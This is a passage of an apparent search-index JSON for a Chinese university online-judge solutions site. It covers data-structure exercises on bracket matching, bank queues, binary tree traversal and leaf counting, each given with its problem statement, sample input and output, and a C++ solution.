\u5f53\u63a5\u53d7\u7b2c1\u4e2a\u53f3\u62ec\u53f7\uff0c\u5219\u548c\u6700\u65b0\u8fdb\u6808\u7684\u5de6\u62ec\u53f7\u8fdb\u884c\u5339\u914d\uff0c\u8868\u793a\u5d4c\u5957\u4e2d1\u7ec4\u62ec\u53f7\u5df2\u7ecf\u5339\u914d\u6d88\u9664 3\u3001 \u82e5\u5230\u6700\u540e\uff0c\u62ec\u53f7\u4e0d\u80fd\u5b8c\u5168\u5339\u914d\uff0c\u5219\u8bf4\u660e\u8f93\u5165\u7684\u8868\u8fbe\u5f0f\u6709\u9519 \u5efa\u8bae\u4f7f\u7528C++\u81ea\u5e26\u7684stack\u5bf9\u8c61\u6765\u5b9e\u73b0 stack\u7c7b\u4f7f\u7528\u7684\u53c2\u8003\u4ee3\u7801 \u5305\u542b\u5934\u6587\u4ef6<stack> \uff1a #include <stack> \u521b\u5efa\u4e00\u4e2a\u5806\u6808\u5bf9\u8c61s\uff08\u6ce8\u610fstack\u662f\u6a21\u677f\u7c7b\uff09\uff1astack <char> s; //\u5806\u6808\u7684\u6570\u636e\u7c7b\u578b\u662f\u5b57\u7b26\u578b \u628a\u4e00\u4e2a\u5b57\u7b26ct\u538b\u5165\u5806\u6808\uff1a s.push(ct); \u628a\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff1as.pop(); \u83b7\u53d6\u6808\u9876\u5143\u7d20\uff0c\u653e\u5165\u53d8\u91cfc2\uff1a c2 = s.top(); \u5224\u65ad\u5806\u6808\u662f\u5426\u7a7a\uff1a s.empty()\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u51fd\u6570\u8fd4\u56detrue\uff0c\u5982\u679c\u4e0d\u7a7a\u5219\u8fd4\u56defalse","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1205/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2at\uff0c\u8868\u793a\u4e0b\u9762\u5c06\u6709t\u7ec4\u6d4b\u8bd5\u6570\u636e\u3002\u63a5\u4e0b\u6765\u7684t\u884c\u7684\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8868\u8fbe\u5f0f\u53ea\u8003\u8651\u82f1\u6587\u534a\u89d2\u72b6\u6001\u8f93\u5165\uff0c\u65e0\u9700\u8003\u8651\u4e2d\u6587\u5168\u89d2\u8f93\u5165","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1205/#_3","text":"\u5bf9\u4e8e\u6bcf\u4e00\u884c\u7684\u8868\u8fbe\u5f0f\uff0c\u68c0\u67e5\u62ec\u53f7\u662f\u5426\u5339\u914d\uff0c\u5339\u914d\u5219\u8f93\u5165ok\uff0c\u4e0d\u5339\u914d\u5219\u8f93\u51faerror","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1205/#_4","text":"1 2 3 2 ( a + b )[ 4 * 5 + ( - 6 )] [ 5 * 8 ] / { ( a + b ) - 6","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1205/#_5","text":"1 2 ok error","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1205/#_6","text":"\u7b97\u6cd5\u6d41\u7a0b 1\u3001\u521d\u59cb\u5316\uff0ci=0\uff0c\u5efa\u7acb\u5806\u6808\uff0c\u6808\u4e3a\u7a7a 2\u3001\u8f93\u5165\u8868\u8fbe\u5f0f\uff0c\u5efa\u7acb\u6307\u9488\u6307\u5411\u8868\u8fbe\u5f0f\u7684\u5934\u90e8 3\u3001\u8bfb\u5165\u8868\u8fbe\u5f0f\u7684\u7b2ci\u4e2a\u5b57\u7b26 4\u3001\u5982\u679c\u7b2ci\u4e2a\u5b57\u7b26\u662f\u5de6\u62ec\u53f7\uff0c\u5165\u6808 5\u3001\u5982\u679c\u7b2ci\u4e2a\u5b57\u7b26\u662f\u53f3\u62ec\u53f7\uff0c\u68c0\u67e5\u6808\u9876\u5143\u7d20\u662f\u5426\u5339\u914d \u2002A.\u5982\u679c\u5339\u914d\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20 \u2002B.\u5982\u679c\u4e0d\u5339\u914d\uff0c\u62a5\u9519\u9000\u51fa 6\u3001i++\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff0c\u662f\u5426\u5df2\u7ecf\u8868\u8fbe\u5f0f\u672b\u5c3e \u2002A. \u672a\u5230\u672b\u5c3e\uff0c\u91cd\u590d\u6b65\u9aa43 \u2002B. \u5df2\u5230\u8fbe\u672b\u5c3e \u2003a. \u5806\u6808\u4e3a\u7a7a\uff0c\u8f93\u51faok \u2003b. \u5806\u6808\u4e0d\u4e3a\u7a7a\uff0c\u8f93\u51faerror","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1205/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include <iostream> #include <stack> bool isBracketsMatch ( const std :: string & expression ) { std :: stack < char > stack ; for ( size_t i = 0 ; i < expression . length (); ++ i ) { switch ( expression [ i ]) { case '(' : case '[' : case '{' : stack . push ( expression [ i ]); break ; case ')' : if (( ! stack . empty ()) && stack . top () == '(' ) { stack . pop (); } else { return false ; } break ; case ']' : if (( ! stack . empty ()) && stack . top () == '[' ) { stack . pop (); } else { return false ; } break ; case '}' : if (( ! stack . empty ()) && stack . top () == '{' ) { stack . pop (); } else { return false ; } break ; default : ; } } return stack . empty (); } int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string expression ; std :: cin >> expression ; if ( isBracketsMatch ( expression )) { std :: cout << \"ok\" << std :: endl ; } else { std :: cout << \"error\" << std :: endl ; } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1207/","text":"DS\u961f\u5217\u4e4b\u94f6\u884c\u6392\u961f \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5728\u94f6\u884c\u8425\u4e1a\u5927\u5385\u5171\u670d\u52a13\u79cd\u5ba2\u6237\uff0c\u7c7b\u578b\u4e3aA\\B\\C\uff0c\u5927\u5385\u5206\u522b\u8bbe\u7f6e\u4e863\u4e2a\u7a97\u53e3\u5206\u522b\u670d\u52a1\u4e09\u79cd\u5ba2\u6237\uff0c\u5373\u6bcf\u4e2a\u7a97\u53e3\u53ea\u670d\u52a1\u4e00\u79cd\u5ba2\u6237\u3002\u73b0\u6709\u4e00\u6279\u5ba2\u6237\u6765\u94f6\u884c\u529e\u7406\u4e1a\u52a1\uff0c\u6bcf\u4e2a\u5ba2\u6237\u90fd\u6709\u7c7b\u578b\u548c\u529e\u7406\u4e1a\u52a1\u65f6\u95f4\u3002\u6bcf\u4e2a\u7a97\u53e3\u6309\u7167\u5ba2\u6237\u5230\u6765\u7684\u987a\u5e8f\u8fdb\u884c\u670d\u52a1\u3002 \u7f16\u7a0b\u5b9e\u73b0\u5b83\u4eec\u7684\u529e\u7406\u6d41\u7a0b\uff0c\u8bf7\u4f7f\u7528C++\u81ea\u5e26\u7684queue\u5fc5\u987b\u4f7f\u7528\u961f\u5217\u5b9e\u73b0\uff0c\u5176\u4ed6\u65b9\u6cd50\u5206\uff01 \u961f\u5217queue\u7684\u7528\u6cd5\u5982\u4e0b\uff1a 1.\u5305\u542b\u5934\u6587\u4ef6\uff1a#include <queue> 2.\u5b9a\u4e49\u4e00\u4e2a\u6574\u6570\u961f\u5217\u5bf9\u8c61\uff1aqueue<int> myQe; 3.\u5b9a\u4e49\u4e00\u4e2a\u6574\u6570\u961f\u5217\u5bf9\u8c61\u6570\u7ec4\uff1aqueue<int> myQA[10]; 4.\u5165\u961f\u64cd\u4f5c\uff1amyQe.push(itemp); //\u628a\u6574\u6570itemp\u8fdb\u5165\u961f\u5217 5.\u51fa\u961f\u64cd\u4f5c\uff1amyQe.pop(); //\u628a\u961f\u5934\u5143\u7d20\u5f39\u51fa\u961f\u5217\uff0c\u6ce8\u610f\u672c\u64cd\u4f5c\u4e0d\u83b7\u53d6\u961f\u5934\u5143\u7d20 6.\u83b7\u53d6\u961f\u5934\u5143\u7d20\uff1a itemp = myQe.front(); // \u628a\u961f\u5934\u5143\u7d20\u653e\u5165itemp\u4e2d\uff0c\u6ce8\u610f\u672c\u64cd\u4f5c\u4e0d\u5f39\u51fa\u5143\u7d20 7.\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\uff1amyQe.empty();//\u961f\u5217\u7a7a\u5219\u8fd4\u56detrue\uff0c\u4e0d\u7a7a\u5219\u8fd4\u56defalse \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u5148\u8f93\u5165n\u8868\u793a\u5ba2\u6237\u6570\u91cf \u7b2c\u4e8c\u884c\u8f93\u5165\u6bcf\u4e2a\u5ba2\u6237\u7684\u7c7b\u578b\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7528\u7a7a\u683c\u9694\u5f00 \u7b2c\u4e09\u884c\u8f93\u5165\u6bcf\u4e2a\u5ba2\u6237\u7684\u529e\u7406\u65f6\u95f4\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7528\u7a7a\u683c\u9694\u5f00 \u8f93\u51fa \u7b2c\u4e00\u884c\u8f93\u51faA\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4 \u7b2c\u4e8c\u884c\u8f93\u51faB\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4 \u7b2c\u4e09\u884c\u8f93\u51faC\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4 \u6837\u4f8b\u8f93\u5165 1 2 3 8 A B C B C A A A 10 20 30 40 50 60 70 80 \u6837\u4f8b\u8f93\u51fa 1 2 3 55 30 40 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include <iostream> #include <queue> int main () { int size ; std :: cin >> size ; std :: queue < char > queue ; for ( int i = 0 ; i < size ; ++ i ) { char customer ; std :: cin >> customer ; queue . push ( customer ); } std :: vector < int > totalTime ( 3 , 0 ), count ( 3 , 0 ); while ( ! queue . empty ()) { int time ; std :: cin >> time ; count [ queue . front () - 'A' ] += 1 ; totalTime [ queue . front () - 'A' ] += time ; queue . pop (); } for ( int i = 0 ; i < 3 ; ++ i ) { std :: cout << totalTime [ i ] / count [ i ] << std :: endl ; } return 0 ; }","title":"DS\u961f\u5217\u4e4b\u94f6\u884c\u6392\u961f"},{"location":"szu_oj/ds/1207/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u961f\u5217\u4e4b\u94f6\u884c\u6392\u961f"},{"location":"szu_oj/ds/1207/#_1","text":"\u5728\u94f6\u884c\u8425\u4e1a\u5927\u5385\u5171\u670d\u52a13\u79cd\u5ba2\u6237\uff0c\u7c7b\u578b\u4e3aA\\B\\C\uff0c\u5927\u5385\u5206\u522b\u8bbe\u7f6e\u4e863\u4e2a\u7a97\u53e3\u5206\u522b\u670d\u52a1\u4e09\u79cd\u5ba2\u6237\uff0c\u5373\u6bcf\u4e2a\u7a97\u53e3\u53ea\u670d\u52a1\u4e00\u79cd\u5ba2\u6237\u3002\u73b0\u6709\u4e00\u6279\u5ba2\u6237\u6765\u94f6\u884c\u529e\u7406\u4e1a\u52a1\uff0c\u6bcf\u4e2a\u5ba2\u6237\u90fd\u6709\u7c7b\u578b\u548c\u529e\u7406\u4e1a\u52a1\u65f6\u95f4\u3002\u6bcf\u4e2a\u7a97\u53e3\u6309\u7167\u5ba2\u6237\u5230\u6765\u7684\u987a\u5e8f\u8fdb\u884c\u670d\u52a1\u3002 \u7f16\u7a0b\u5b9e\u73b0\u5b83\u4eec\u7684\u529e\u7406\u6d41\u7a0b\uff0c\u8bf7\u4f7f\u7528C++\u81ea\u5e26\u7684queue\u5fc5\u987b\u4f7f\u7528\u961f\u5217\u5b9e\u73b0\uff0c\u5176\u4ed6\u65b9\u6cd50\u5206\uff01 \u961f\u5217queue\u7684\u7528\u6cd5\u5982\u4e0b\uff1a 1.\u5305\u542b\u5934\u6587\u4ef6\uff1a#include <queue> 2.\u5b9a\u4e49\u4e00\u4e2a\u6574\u6570\u961f\u5217\u5bf9\u8c61\uff1aqueue<int> myQe; 3.\u5b9a\u4e49\u4e00\u4e2a\u6574\u6570\u961f\u5217\u5bf9\u8c61\u6570\u7ec4\uff1aqueue<int> myQA[10]; 4.\u5165\u961f\u64cd\u4f5c\uff1amyQe.push(itemp); //\u628a\u6574\u6570itemp\u8fdb\u5165\u961f\u5217 5.\u51fa\u961f\u64cd\u4f5c\uff1amyQe.pop(); //\u628a\u961f\u5934\u5143\u7d20\u5f39\u51fa\u961f\u5217\uff0c\u6ce8\u610f\u672c\u64cd\u4f5c\u4e0d\u83b7\u53d6\u961f\u5934\u5143\u7d20 6.\u83b7\u53d6\u961f\u5934\u5143\u7d20\uff1a itemp = myQe.front(); // \u628a\u961f\u5934\u5143\u7d20\u653e\u5165itemp\u4e2d\uff0c\u6ce8\u610f\u672c\u64cd\u4f5c\u4e0d\u5f39\u51fa\u5143\u7d20 7.\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\uff1amyQe.empty();//\u961f\u5217\u7a7a\u5219\u8fd4\u56detrue\uff0c\u4e0d\u7a7a\u5219\u8fd4\u56defalse","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1207/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u5148\u8f93\u5165n\u8868\u793a\u5ba2\u6237\u6570\u91cf \u7b2c\u4e8c\u884c\u8f93\u5165\u6bcf\u4e2a\u5ba2\u6237\u7684\u7c7b\u578b\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7528\u7a7a\u683c\u9694\u5f00 \u7b2c\u4e09\u884c\u8f93\u5165\u6bcf\u4e2a\u5ba2\u6237\u7684\u529e\u7406\u65f6\u95f4\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7528\u7a7a\u683c\u9694\u5f00","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1207/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u51faA\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4 \u7b2c\u4e8c\u884c\u8f93\u51faB\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4 \u7b2c\u4e09\u884c\u8f93\u51faC\u7c7b\u5ba2\u6237\u7684\u5e73\u5747\u529e\u7406\u65f6\u95f4","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1207/#_4","text":"1 2 3 8 A B C B C A A A 10 20 30 40 50 60 70 80","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1207/#_5","text":"1 2 3 55 30 40","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1207/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1207/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include <iostream> #include <queue> int main () { int size ; std :: cin >> size ; std :: queue < char > queue ; for ( int i = 0 ; i < size ; ++ i ) { char customer ; std :: cin >> customer ; queue . push ( customer ); } std :: vector < int > totalTime ( 3 , 0 ), count ( 3 , 0 ); while ( ! queue . empty ()) { int time ; std :: cin >> time ; count [ queue . front () - 'A' ] += 1 ; totalTime [ queue . front () - 'A' ] += time ; queue . pop (); } for ( int i = 0 ; i < 3 ; ++ i ) { std :: cout << totalTime [ i ] / count [ i ] << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1213/","text":"DS\u4e8c\u53c9\u6811--\u4e8c\u53c9\u6811\u6784\u5efa\u4e0e\u904d\u5386 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\uff0c\uff08\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u4f8b\u5982AB0C00D00\uff09\uff0c\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\uff0c\u5e76\u8f93\u51fa\u8be5\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u3001\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u7ed3\u679c \u672c\u9898\u76ee\u7684\u4ee3\u7801\u6846\u67b6\u53c2\u8003\u5982\u4e0b \u4e09\u79cd\u904d\u5386\u7684\u4ee3\u7801\u6846\u67b6 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8fde\u7eed\u8f93\u5165t\u884c \u8f93\u51fa \u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u3001\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u7ed3\u679c \u6837\u4f8b\u8f93\u5165 1 2 3 2 AB0C00D00 AB00C00 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 ABCD BCAD CBDA ABC BAC BCA \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } void preOrderTraverse () { preOrderTraverse ( root ); std :: cout << std :: endl ; } void inOrderTraverse () { inOrderTraverse ( root ); std :: cout << std :: endl ; } void postOrderTraverse () { postOrderTraverse ( root ); std :: cout << std :: endl ; } private : struct Node { char data ; Node * left ; Node * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void preOrderTraverse ( Node * node ) { if ( node ) { std :: cout . put ( node -> data ); preOrderTraverse ( node -> left ); preOrderTraverse ( node -> right ); } } void inOrderTraverse ( Node * node ) { if ( node ) { inOrderTraverse ( node -> left ); std :: cout . put ( node -> data ); inOrderTraverse ( node -> right ); } } void postOrderTraverse ( Node * node ) { if ( node ) { postOrderTraverse ( node -> left ); postOrderTraverse ( node -> right ); std :: cout . put ( node -> data ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); biTree . preOrderTraverse (); biTree . inOrderTraverse (); biTree . postOrderTraverse (); } return 0 ; }","title":"DS\u4e8c\u53c9\u6811--\u4e8c\u53c9\u6811\u6784\u5efa\u4e0e\u904d\u5386"},{"location":"szu_oj/ds/1213/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811--\u4e8c\u53c9\u6811\u6784\u5efa\u4e0e\u904d\u5386"},{"location":"szu_oj/ds/1213/#_1","text":"\u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\uff0c\uff08\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u4f8b\u5982AB0C00D00\uff09\uff0c\u5efa\u7acb\u8be5\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\uff0c\u5e76\u8f93\u51fa\u8be5\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u3001\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u7ed3\u679c \u672c\u9898\u76ee\u7684\u4ee3\u7801\u6846\u67b6\u53c2\u8003\u5982\u4e0b \u4e09\u79cd\u904d\u5386\u7684\u4ee3\u7801\u6846\u67b6","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1213/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u4e8c\u53c9\u6811 \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8fde\u7eed\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1213/#_3","text":"\u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u3001\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u7ed3\u679c","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1213/#_4","text":"1 2 3 2 AB0C00D00 AB00C00","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1213/#_5","text":"1 2 3 4 5 6 ABCD BCAD CBDA ABC BAC BCA","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1213/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1213/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } void preOrderTraverse () { preOrderTraverse ( root ); std :: cout << std :: endl ; } void inOrderTraverse () { inOrderTraverse ( root ); std :: cout << std :: endl ; } void postOrderTraverse () { postOrderTraverse ( root ); std :: cout << std :: endl ; } private : struct Node { char data ; Node * left ; Node * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void preOrderTraverse ( Node * node ) { if ( node ) { std :: cout . put ( node -> data ); preOrderTraverse ( node -> left ); preOrderTraverse ( node -> right ); } } void inOrderTraverse ( Node * node ) { if ( node ) { inOrderTraverse ( node -> left ); std :: cout . put ( node -> data ); inOrderTraverse ( node -> right ); } } void postOrderTraverse ( Node * node ) { if ( node ) { postOrderTraverse ( node -> left ); postOrderTraverse ( node -> right ); std :: cout . put ( node -> data ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); biTree . preOrderTraverse (); biTree . inOrderTraverse (); biTree . postOrderTraverse (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1214/","text":"DS\u4e8c\u53c9\u6811--\u53f6\u5b50\u6570\u91cf \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8ba1\u7b97\u4e00\u9897\u4e8c\u53c9\u6811\u5305\u542b\u7684\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf\u3002 \u63d0\u793a\uff1a\u53f6\u5b50\u662f\u6307\u5b83\u7684\u5de6\u53f3\u5b69\u5b50\u4e3a\u7a7a\u3002 \u5efa\u6811\u65b9\u6cd5\u91c7\u7528\u201c\u5148\u5e8f\u904d\u5386+\u7a7a\u6811\u75280\u8868\u793a\u201d\u7684\u65b9\u6cd5\uff0c\u5373\u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\u4e3aAB0C00D00\uff0c\u5176\u4e2d\u7a7a\u8282\u70b9\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\u3002\u5219\u8be5\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\u3002 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u6570\u636e \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e8c\u53c9\u6811\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\uff0c\u7a7a\u6811\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\uff0c\u8f93\u5165t\u884c \u8f93\u51fa \u9010\u884c\u8f93\u51fa\u6bcf\u4e2a\u4e8c\u53c9\u6811\u7684\u5305\u542b\u7684\u53f6\u5b50\u6570\u91cf \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 AB0C00D00 AB00C00 ABC00D00E00 \u6837\u4f8b\u8f93\u51fa 1 2 3 2 2 3 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #include <iostream> #include <string> class BiTree { public : BiTree () : root ( NULL ) {} void assign ( const std :: string & string ) { int index = 0 ; assign ( string , index , root ); } int leaves () { int count = 0 ; leaves ( root , count ); return count ; } private : struct Node { char data ; Node * left , * right ; Node () : data ( 0 ), left ( NULL ), right ( NULL ) {} explicit Node ( char data ) : data ( data ), left ( NULL ), right ( NULL ) {} }; Node * root ; void assign ( const std :: string & string , int & index , Node *& node ) { char data = string [ index ++ ]; if ( data != '0' ) { node = new Node ( data ); assign ( string , index , node -> left ); assign ( string , index , node -> right ); } else { node = NULL ; } } void leaves ( Node * node , int & count ) { if ( node ) { if ( node -> left == NULL && node -> right == NULL ) { count += 1 ; } leaves ( node -> left , count ); leaves ( node -> right , count ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; class BiTree biTree ; biTree . assign ( string ); std :: cout << biTree . leaves () << std :: endl ; } return 0 ; }","title":"DS\u4e8c\u53c9\u6811--\u53f6\u5b50\u6570\u91cf"},{"location":"szu_oj/ds/1214/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811--\u53f6\u5b50\u6570\u91cf"},{"location":"szu_oj/ds/1214/#_1","text":"\u8ba1\u7b97\u4e00\u9897\u4e8c\u53c9\u6811\u5305\u542b\u7684\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf\u3002 \u63d0\u793a\uff1a\u53f6\u5b50\u662f\u6307\u5b83\u7684\u5de6\u53f3\u5b69\u5b50\u4e3a\u7a7a\u3002 \u5efa\u6811\u65b9\u6cd5\u91c7\u7528\u201c\u5148\u5e8f\u904d\u5386+\u7a7a\u6811\u75280\u8868\u793a\u201d\u7684\u65b9\u6cd5\uff0c\u5373\u7ed9\u5b9a\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u7684\u7ed3\u679c\u4e3aAB0C00D00\uff0c\u5176\u4e2d\u7a7a\u8282\u70b9\u7528\u5b57\u7b26\u20180\u2019\u8868\u793a\u3002\u5219\u8be5\u6811\u7684\u903b\u8f91\u7ed3\u6784\u5982\u4e0b\u56fe\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1214/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u6570\u636e 